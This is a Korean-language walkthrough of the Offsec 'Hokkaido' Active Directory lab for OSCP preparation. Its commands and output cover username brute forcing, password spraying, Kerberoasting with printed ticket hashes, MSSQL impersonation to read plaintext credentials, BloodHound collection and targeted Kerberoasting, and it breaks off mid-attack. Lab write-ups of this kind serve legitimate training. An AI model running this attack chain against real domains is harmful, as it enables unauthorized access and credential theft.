# 0. Offsec Proving Grounds Walkthrough for OSCP prep

> The lab focuses on exploiting enumeration techniques such as SMB enumeration, Kerberoasting, and MSSQL enumeration. You'll also learn password cracking methods and ticket generation processes. This lab emphasizes practical skills in privilege escalation and credential harvesting.

# 1. Recon

## 1.1. nmap

```bash
┌──(root㉿kali)-[/home/kali/PG/hokkaido]
└─# nmap -sV -A -p$ports --min-rate 5000 $IP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-13 16:33 +04
Nmap scan report for 192.168.173.40
Host is up (0.080s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-13 12:33:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
|_ssl-date: 2026-02-13T12:34:46+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
|_ssl-date: 2026-02-13T12:34:46+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   192.168.173.40:1433:
|     Target_Name: HAERO
|     NetBIOS_Domain_Name: HAERO
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: hokkaido-aerospace.com
|     DNS_Computer_Name: dc.hokkaido-aerospace.com
|     DNS_Tree_Name: hokkaido-aerospace.com
|_    Product_Version: 10.0.20348
| ms-sql-info:
|   192.168.173.40:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-08-02T02:13:54
|_Not valid after:  2054-08-02T02:13:54
|_ssl-date: 2026-02-13T12:34:46+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
|_ssl-date: 2026-02-13T12:34:46+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
|_ssl-date: 2026-02-13T12:34:46+00:00; 0s from scanner time.
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Not valid before: 2026-02-12T12:30:20
|_Not valid after:  2026-08-14T12:30:20
| rdp-ntlm-info:
|   Target_Name: HAERO
|   NetBIOS_Domain_Name: HAERO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hokkaido-aerospace.com
|   DNS_Computer_Name: dc.hokkaido-aerospace.com
|   DNS_Tree_Name: hokkaido-aerospace.com
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-13T12:34:38+00:00
|_ssl-date: 2026-02-13T12:34:46+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8530/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: 403 - Forbidden: Access is denied.
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
8531/tcp  open  unknown
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
58538/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   192.168.173.40:58538:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 58538
|_ssl-date: 2026-02-13T12:34:46+00:00; 0s from scanner time.
| ms-sql-ntlm-info:
|   192.168.173.40:58538:
|     Target_Name: HAERO
|     NetBIOS_Domain_Name: HAERO
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: hokkaido-aerospace.com
|     DNS_Computer_Name: dc.hokkaido-aerospace.com
|     DNS_Tree_Name: hokkaido-aerospace.com
|_    Product_Version: 10.0.20348
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-08-02T02:13:54
|_Not valid after:  2054-08-02T02:13:54
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2016 (94%), Microsoft Windows Server 2022 (93%), Microsoft Windows 10 1607 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2019 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 (89%), Microsoft Windows Server 2016 or Server 2019 (89%), Microsoft Windows Server 2012 (88%), Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-02-13T12:34:38
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   80.97 ms 192.168.45.1
2   80.94 ms 192.168.45.254
3   81.04 ms 192.168.251.1
4   81.09 ms 192.168.173.40

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.97 seconds
```

## 1.2. SMB - 135

```bash
┌──(root㉿kali)-[/home/kali/PG/hokkaido]
└─# smbclient -N -L //$IP
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.173.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

┌──(root㉿kali)-[/home/kali/PG/hokkaido]
└─# smbmap -H $IP

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 0 authenticated session(s)
[!] Access denied on 192.168.173.40, no fun for you...
[*] Closed 1 connections

┌──(root㉿kali)-[/home/kali/PG/hokkaido]
└─# rpcclient -U ""%"" $IP
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> ^C
```

## 1.3. kerbrute 이용 username brute force attack

도무지 접근할 게 없으니 유저 이름을 브루트포스 공격하는 거를 계획한다. 이거를 실행하기 위해서  `seclists` 에 있는 파일들을 확인했다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/hokkaido]
└─# locate username
[...SNIP...]
/usr/share/seclists/Usernames/sap-default-usernames.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

그 다음 `kerbrute` 이용해서 브루트포스 공격을 진행했다.

```bash
┌──(root㉿kali)-[/home/kali/PG/hokkaido]
└─# kerbrute userenum -d hokkaido-aerospace.com --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 02/13/26 - Ronnie Flathers @ropnop

2026/02/13 16:52:48 >  Using KDC(s):
2026/02/13 16:52:48 >  	192.168.173.40:88

2026/02/13 16:52:48 >  [+] VALID USERNAME:	 info@hokkaido-aerospace.com
2026/02/13 16:53:08 >  [+] VALID USERNAME:	 administrator@hokkaido-aerospace.com
2026/02/13 16:53:19 >  [+] VALID USERNAME:	 INFO@hokkaido-aerospace.com
2026/02/13 16:53:59 >  [+] VALID USERNAME:	 Info@hokkaido-aerospace.com
2026/02/13 16:54:46 >  [+] VALID USERNAME:	 discovery@hokkaido-aerospace.com
2026/02/13 16:54:50 >  [+] VALID USERNAME:	 Administrator@hokkaido-aerospace.com
^C
```

그리하여 나온 파일들은 아래와 같다.

```bash
┌──(root㉿kali)-[/home/kali/PG/hokkaido]
└─# cat users.txt
info
administrator
discovery
```

SMB 서비스에 대해서 접근 가능한지 확인을 진행했고, `info:info` 라는 계정이 접근이 가능한 것을 확인했다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/hokkaido]
└─# nxc smb $IP -u users.txt -p users.txt --continue-on-success
SMB         192.168.173.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False)
SMB         192.168.173.40  445    DC               [+] hokkaido-aerospace.com\info:info
SMB         192.168.173.40  445    DC               [-] hokkaido-aerospace.com\administrator:info STATUS_LOGON_FAILURE
SMB         192.168.173.40  445    DC               [-] hokkaido-aerospace.com\discovery:info STATUS_LOGON_FAILURE
SMB         192.168.173.40  445    DC               [-] hokkaido-aerospace.com\administrator:administrator STATUS_LOGON_FAILURE
SMB         192.168.173.40  445    DC               [-] hokkaido-aerospace.com\discovery:administrator STATUS_LOGON_FAILURE
SMB         192.168.173.40  445    DC               [-] hokkaido-aerospace.com\administrator:discovery STATUS_LOGON_FAILURE
SMB         192.168.173.40  445    DC               [-] hokkaido-aerospace.com\discovery:discovery STATUS_LOGON_FAILURE
```

## 1.4. SMB - user 'info'

`info` 계정으로 로그인을 시도했다.  `homes` 와 `NETLOGON`, `SYSVOL` 의 폴더를 식별했다.

```bash
┌──(root㉿kali)-[/home/kali/PG/hokkaido]
└─# nxc smb $IP -u 'info' -p 'info' --shares
SMB         192.168.173.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False)
SMB         192.168.173.40  445    DC               [+] hokkaido-aerospace.com\info:info
SMB         192.168.173.40  445    DC               [*] Enumerated shares
SMB         192.168.173.40  445    DC               Share           Permissions     Remark
SMB         192.168.173.40  445    DC               -----           -----------     ------
SMB         192.168.173.40  445    DC               ADMIN$                          Remote Admin
SMB         192.168.173.40  445    DC               C$                              Default share
SMB         192.168.173.40  445    DC               homes           READ,WRITE      user homes
SMB         192.168.173.40  445    DC               IPC$            READ            Remote IPC
SMB         192.168.173.40  445    DC               NETLOGON        READ            Logon server share
SMB         192.168.173.40  445    DC               SYSVOL          READ            Logon server share
SMB         192.168.173.40  445    DC               UpdateServicesPackages READ            A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
SMB         192.168.173.40  445    DC               WsusContent     READ            A network share to be used by Local Publishing to place published content on this WSUS system.
SMB         192.168.173.40  445    DC               WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
```

### 1.4.1. homes directory

`homes` 디렉토리에서는 계정 정보로 추정되는 것들을 식별했다.

```bash
┌──(root㉿kali)-[/home/kali/PG/hokkaido]
└─# smbclient -U "info"%"info" //$IP/homes
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> ls
  .                                   D        0  Fri Feb 13 17:04:19 2026
  ..                                DHS        0  Fri Feb 13 16:30:23 2026
  Angela.Davies                       D        0  Sat Nov 25 18:57:09 2023
  Annette.Buckley                     D        0  Sat Nov 25 18:57:09 2023
  Anthony.Anderson                    D        0  Sat Nov 25 18:57:09 2023
  Catherine.Knight                    D        0  Sat Nov 25 18:57:09 2023
  Charlene.Wallace                    D        0  Sat Nov 25 18:57:09 2023
  Cheryl.Singh                        D        0  Sat Nov 25 18:57:09 2023
  Deborah.Francis                     D        0  Sat Nov 25 18:57:09 2023
  Declan.Woodward                     D        0  Sat Nov 25 18:57:09 2023
  Elliott.Jones                       D        0  Sat Nov 25 18:57:09 2023
  Gordon.Brown                        D        0  Sat Nov 25 18:57:09 2023
  Grace.Lees                          D        0  Sat Nov 25 18:57:09 2023
  Hannah.O'Neill                      D        0  Sat Nov 25 18:57:09 2023
  Irene.Dean                          D        0  Sat Nov 25 18:57:09 2023
  Julian.Davies                       D        0  Sat Nov 25 18:57:09 2023
  Lynne.Tyler                         D        0  Sat Nov 25 18:57:09 2023
  Molly.Edwards                       D        0  Sat Nov 25 18:57:09 2023
  Rachel.Jones                        D        0  Sat Nov 25 18:57:09 2023
  Sian.Gordon                         D        0  Sat Nov 25 18:57:09 2023
  Tracy.Wood                          D        0  Sat Nov 25 18:57:09 2023
  Victor.Kelly                        D        0  Sat Nov 25 18:57:09 2023
  
  \Angela.Davies
  .                                   D        0  Sat Nov 25 18:57:09 2023
  ..                                  D        0  Fri Feb 13 17:04:19 2026

[...SNIP...]
```

### 1.4.2. NETLOGON

`NETLOGON` 에서는 `password_reset.txt` 파일을 식별했다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/hokkaido]
└─# smbclient -U "info"%"info" //$IP/NETLOGON
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> ls
  .                                   D        0  Sat Nov 25 17:40:08 2023
  ..                                  D        0  Sat Nov 25 17:17:33 2023
  temp                                D        0  Wed Dec  6 19:44:26 2023

\temp
  .                                   D        0  Wed Dec  6 19:44:26 2023
  ..                                  D        0  Sat Nov 25 17:40:08 2023
  password_reset.txt                  A       27  Sat Nov 25 17:40:29 2023

		7699711 blocks of size 4096. 1919237 blocks available
smb: \>
```

해당 파일에서는 초기 비번에 대해서 언급하고 있다.

```bash
┌──(root㉿kali)-[/home/kali/PG/hokkaido]
└─# cat password_reset.txt
Initial Password: Start123!
```

이걸 통해서 아까 수집한 `users.txt` 파일에 다른 계정을 통해 `discovery:Start123!` 크리덴셜을 획득할 수 있었다.

```bash
┌──(root㉿kali)-[/home/kali/PG/hokkaido]
└─# nxc smb $IP -u users.txt -p 'Start123!' --continue-on-success
SMB         192.168.173.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False)
SMB         192.168.173.40  445    DC               [-] hokkaido-aerospace.com\info:Start123! STATUS_LOGON_FAILURE
SMB         192.168.173.40  445    DC               [-] hokkaido-aerospace.com\administrator:Start123! STATUS_LOGON_FAILURE
SMB         192.168.173.40  445    DC               [+] hokkaido-aerospace.com\discovery:Start123!
```

## 1.5. GetUserSPNs 시도

`discovery` 계정을 통해서 SPN계정들에 대해 정보를 수집했다. 여기서는 특별한 거를 얻을 수 없었다.

```bash
┌──(root㉿kali)-[/home/kali/PG/hokkaido]
└─# impacket-GetUserSPNs hokkaido-aerospace.com/discovery:'Start123!' -dc-ip $IP -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName                   Name         MemberOf                                           PasswordLastSet             LastLogon                   Delegation
-------------------------------------  -----------  -------------------------------------------------  --------------------------  --------------------------  ----------
discover/dc.hokkaido-aerospace.com     discovery    CN=services,CN=Users,DC=hokkaido-aerospace,DC=com  2023-12-06 19:42:56.221832  2026-02-13 17:09:01.297267
maintenance/dc.hokkaido-aerospace.com  maintenance  CN=services,CN=Users,DC=hokkaido-aerospace,DC=com  2023-11-25 17:39:04.869703  <never>



[-] CCache file is not found. Skipping...
$krb5tgs$23$*discovery$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/discovery*$be049acb9eb9fbc1281838832b93c238$6a4a9d6deb5b5e79403cc80e48fa92a2e555444d9d835d26d1292e1f93bb4000f8397fcae85700c3fca06aece8773c2daf773b92f8c0ea8fe0894f2a616c29a042974bbb637627134b85d13e42f18a5d555fb28a6d93d0a2944952ecb31995e7a3f3bb81fdd1589d7cf6586310618fb51f51caa5137864d8b86e254175a98c6e00960cf7d5bdf363c3c576656bfa6aa049b2497d2f6069b4dc1def16e5fb3c6edd84d353f5478e0436192cb32ac488602f752b518f74784c5fb6f83c7b8b5c8d7c33358c709f669276c13e97c4afac90ddec9a97e5fca22897950fcc84e36c749bd59d81f7cc139dfea22c71240f7ef24a9f5a1bc5cfb62ea3b397f34e915b84f5baad88405369f27563497d7e7fe23ae25cc9300ba85737a3cc0d2502fdc2517078afc0b910f250ab772506840bc54f966d38972fb28f8fd248969c559b9fbd9e7a84ef3e0da1f0cf361e927570d75997c4c3579bc1bbd80742819c178a8c7cc88a5fadb6c353f84cd8db5b93cd45b42b2601ea95980b058c3f6d36e6f5c4e88cde0aa7e87522838b98674f0edc067b08cde512828a4841ef893828421b000a23bf158e196e964365d176f847db33836e77c8bd7ec872919bedd28f933fd697a9bf16163d17ca6263dd272c909716e507e23b4a9cd42c7d90ce4deac364b2e768a311749aff625f45d8aeb3af01b8d2a450dfe10ec33f6567198533d58089c3dea201ed39d1a9704b097dad77b45f7fd73aa6d2f4b6ceeef945477e8f184be224f6686e0148ff85c0f83724f1ea0ffb2afc77d03ed3dceabde726930a22a73ed80d59c43127faaff0770f913669d1e180d810236ec3855529c5e06ef160f06075effa9dae5f5a699475cab967e9665331994648aecd70774f24c579c921d58e83f3ef16522b1aa248dea0a6103d5a3ca27c2162b3d40c3f1e66722afd9439041f9eaf5bd33c0fbaffede5f397a357e1564b33da9182226c4e5bf38b869f8e0db6e1991373297e751ef6327e033d072899bb4dffe1b8dac601273e3126dff418a8c70d900900accf175f2892400ae73317d82b979869e2437b804c1f5b81d2dd009b85005ab23ad0a04542297de3d00dff1155d88c570c018a4d0937430e703f069c10361f3cd9fafd59437024f1b3bbb79723e65d8debe375bc3af54a753ad0643495a7f8230902d4407980d20e0cb5260bb4827e98a30ee0ae748f0931db17a0baec58d7acf222c5f1c0541bd357160712de212d1444c7be280865e03d2ed0e58a0e67d5aef13e2b1521c703b40c9622967a92e8bfa7439b2ee31d6265ca24ac66133638e3525ca86dd79cdf3b8ea1639208155d05e16b5a09827db29dc00f604499cf79e615f4e356440036c4e3cb965b1eb98143620420f18000c9da47b02aaabc1d32616d8011d0771d1eb370d79e228a27c756f1035aa0519c94b399f957ac257898be8e5370c936a92b3ee80f2c0b19c9d336d6e8890fc81b51c832f580963211fd9bf3139b0e99e70f70402f0342c5cfe5eea1f557b6bca5c4aa8aad31154dc8fb6f9eacd4856029c20aaae61ec661cd135d6cd6e083034a8686acaa
$krb5tgs$23$*maintenance$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/maintenance*$a36ceae3535bc56d9cd087bba15933be$3e8d825cf09d2ede4d0f62cd4abf127ce9b8a6740e1bd0f035d29f88a0ac830ff1ba5b6179ed67fd69f7cc44609c7be209ae6fdc0f2b9f4f48cd82769482ab35b7cc90651cfc935a5ff63f6e458f70e007ebf6ee6636a03eb5745a5ab700b4b286b05be603d3f47c1bef7111c4feeb7d143252996430822a21efe3e870d17010878fc277be723f08408d8bc6c22a3014219475a5ac1b8bbcc83e47462032506e23c02d14b0c701d573dbbdc0e4150cecf672695b1498fe4eb14742d9453edfa3e6a1aef52081821447882110bdc55a42dd035462f21c843c84ec9c4af0f72474df57ed1415744a4c2ee6493a34a8494b41d85eb528190e7b978ea876508263620f37125dc1f8ce5555a6e408c43edc535b52c5c282e41b07f11a59a188cccb6c1672f8e25056dc5b3c72eb9b22ac14451eabe3e59c8fe07042b05af0b19e7cae6054409610f261fda7734826549c0e8fa107817f626aa92d7a81742c5294364847173941ed50ecc7050388474b9a87da0b9b8c5d2b54188bf298f0dc5e9a2dafa6593fcf7f6e5b36be50d6c9586b1821eb1a2b4b89f052f50bc2e4972486adebd3688618db3a3a5600997fbbf075fabc2529456cce9f466eae4c56e3f6a2a422914c1cfa27a6dd8079cbfbc0738896f2abfa1c06e2a3549c1f18a0803f62ffbf22c31b2da1e6fd488d3cb095dd1c977e02e8f3b03bd9c6d8524d50e0600ca5b4ab65cef7efad44d858cee68203aba5db6c253de3e69db847afde94a6490dc5a8db789dd809802e103346d5d471ad165d6bad61fe34d38afd53c80a1d7689ea669cdde9d61fb71562eed9a9c2564d607815001de18adb4944c113483d4ea43eb2c6734dd6dda71bc162ae294f7999065b763b6e802d9a5f26d97955553f022b688171f53f2aa1d4716e52d5349c7ff39a90c97ed31511c3a9756c33eabc4c10fe507c592962839d87bcfd36b08d76ed0c27d838f10b0ef0395c1a90205b2608a79c2c36f71cf46a5d00d2d60eb5075edfcb4df988d5e52e8cef3e3510966b60bab948ccfbb82366caeda8e57c02cd215b5213d485377350842dc496589ab4bcb4c0aaa5cf5ba7cad860ac827a70ea383c31c9c7b895ea96c0ec5bf8153bd1a073e456c1621286b00070757ed50a5eb477f9cc2c6c8f921383b2942a980fd4f282c5cc1b7faf4eff88301b504b56f3800820b4ce825f23fe9cb4a641334a5ef32d03f813b6f61bb8fa31b2fb08ed77b50072402ee71116bcc73f868bf00ecb97f4421f528eaf55e5624a83f5ba980a6e1c14f425dc782c310e2be522d2524077694ab1347a07f0408a6fcb6cf0cc074c6ccae5a8696d2d4809ea37dbf04a67577b94680d4130df83c3ec1d5e43427c422304d52da21c0ee39854ed29b5acf51c5cbd167ae4dd2512af09aba8e15898c93f0568195c5e63ca29fb20ea896520a8cd2bf45284e5a35a70aedc3d53a14577abcfd836213f6849526df5aba9c93da30bb32dcfeeab0b25db73444dbfa5085dfe947268f6d70e98d01d589c80a9776f229a87dcd81d811315070a6fb7b0cef4c8232374ab564a82e47db22348b89634cc
```

## 1.6. mssql 접근 시도

`nmap` 정찰 당시 mssql 1433 번 포트가 운용중에 있었으므로 접근을 시도했고 정상적으로 접근이 가능해졌다.

```bash
┌──(root㉿kali)-[/home/kali/PG/hokkaido]
└─# impacket-mssqlclient  'hokkaido-aerospace.com/discovery':'Start123!'@$IP -dc-ip $IP -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (HAERO\discovery  guest@master)> SELECT name FROM master..sysdatabases;
name
-------
master

tempdb

model

msdb

hrappdb
```

### 1.6.1. hrappdb 탐색

`hrappdb` 라는 데이터베이스를 선택한다. 하지만 되지 않았다.

```bash
SQL (HAERO\discovery  guest@master)> use hrappdb
ERROR(DC\SQLEXPRESS): Line 1: The server principal "HAERO\discovery" is not able to access the database "hrappdb" under the current security context.
```

### 1.6.2. IMPERSONATE 시도

`hrappdb` 로 접근을 하고 싶은데 되지 않으니까, `discovery` 권한으로 다른 유저로 변환을 할 수 있는지 질의를 했고 `hrappdb-reader` 로 변환이 된다는 거를 식별했다. 

```bash
SQL (HAERO\discovery  guest@master)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
name
--------------
hrappdb-reader

```

`hrappdb-reader` 로 변환을 진행했다.

```bash
SQL (HAERO\discovery  guest@master)> EXECUTE AS LOGIN = 'hrappdb-reader'
SQL (hrappdb-reader  guest@master)> use hrappdb
ENVCHANGE(DATABASE): Old Value: master, New Value: hrappdb
INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'hrappdb'.
```

### 1.6.3. hrappdb 탐색 (2)

내부를 살펴본다. 그 결과 `hrapp-service:Untimed$Runny` 라는 크리덴셜을 확보할 수 있었다.

```bash
SQL (hrappdb-reader  hrappdb-reader@hrappdb)> SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE
-------------   ------------   ----------   ----------
hrappdb         dbo            sysauth      b'BASE TABLE'

SQL (hrappdb-reader  hrappdb-reader@hrappdb)> select * from sysauth;
id   name               password
--   ----------------   ----------------
 0   b'hrapp-service'   b'Untimed$Runny'
```

# 2. Initial Access

## 2.1. Bloodhound 로 내부 탐색

### 2.1.1. bloodhound-python 

`bloodhound-python` 을 통해서 `hrapp-service` 계정을 통해 데이터를 수집한다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/hokkaido]
└─# bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.com -c all --zip -ns $IP
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hokkaido-aerospace.com
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.hokkaido-aerospace.com:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.hokkaido-aerospace.com
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.hokkaido-aerospace.com
INFO: Found 34 users
INFO: Found 62 groups
INFO: Found 2 gpos
INFO: Found 6 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer:
INFO: Querying computer: dc.hokkaido-aerospace.com
INFO: Done in 00M 17S
INFO: Compressing output into 20260213174210_bloodhound.zip
```

`hrapp-service` 는 `hazel.green` 에 대해서 `GenericWrite` 를 갖고 있다.

![](../images/WindowsAD-03.%20hokkaido.png)

## 2.2. hazel.green 크리덴셜 획득

`targetedKerberoast` 파일을 다운받는다. 이걸 통해서 우리는 내부에 다른 `SPN` 의 해쉬를 얻을 수 있다.

```bash
┌──(root㉿kali)-[/home/kali/PG/hokkaido]
└─# git clone https://github.com/ShutdownRepo/targetedKerberoast.git
Cloning into 'targetedKerberoast'...
remote: Enumerating objects: 76, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (19/19), done.
remote: Total 76 (delta 19), reused 18 (delta 14), pack-reused 43 (from 1)
Receiving objects: 100% (76/76), 252.27 KiB | 6.64 MiB/s, done.
Resolving deltas: 100% (30/30), done.

┌──(root㉿kali)-[/home/kali/PG/hokkaido]
└─# cd targetedKerberoast
```

`hrapp-service` 의 크리덴셜을 통해서 `Hazel.Green` 의 크리덴셜을 확보할 수 있었다.

```bash
┌──(root㉿kali)-[/home/kali/PG/hokkaido/targetedKerberoast]
└─# python targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip $IP
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Hazel.Green)
[+] Printing hash for (Hazel.Green)
